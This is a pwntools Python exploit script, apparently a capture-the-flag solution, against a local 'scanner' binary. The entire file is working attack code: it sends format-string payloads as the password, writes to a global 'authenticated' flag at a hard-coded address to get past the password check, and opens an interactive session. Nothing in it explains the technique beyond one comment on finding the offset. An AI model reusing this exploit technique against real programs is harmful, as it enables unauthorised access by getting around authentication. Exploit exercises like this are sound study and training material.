#!/usr/bin/env python3

from pwn import *

binary, host, port = "./scanner", "localhost", 45254

# Setup #######################################################################
context.update(arch="amd64", os="linux")
context.terminal = ["tmux", "splitw", "-h"]

context.binary = elf = ELF(binary, checksec=False)
if args.REMOTE:
    p = remote(host, port)
else:
    p = process(elf.path, aslr=False)
###############################################################################

CEO_DOC = 4

# find offset by sending "%n$p" as password changing n until you see your input
FMTSTR_OFFSET = 10
# address of global variable authenticated
AUTHENTICATED_ADDR = 0x00404024


def send_payload(payload):
    log.info(f"Sending payload: {payload}")
    p.sendlineafter(b"Select a device to scan: ", str(CEO_DOC).encode())
    p.sendlineafter(b"password: ", payload)
    p.recvuntil(b"with: ")
    received = p.recvline().strip()
    log.info(f"Received: {received}")
    return received


format_string = FmtStr(execute_fmt=send_payload, offset=FMTSTR_OFFSET)
format_string.write(AUTHENTICATED_ADDR, 1)
format_string.execute_writes()

p.interactive()
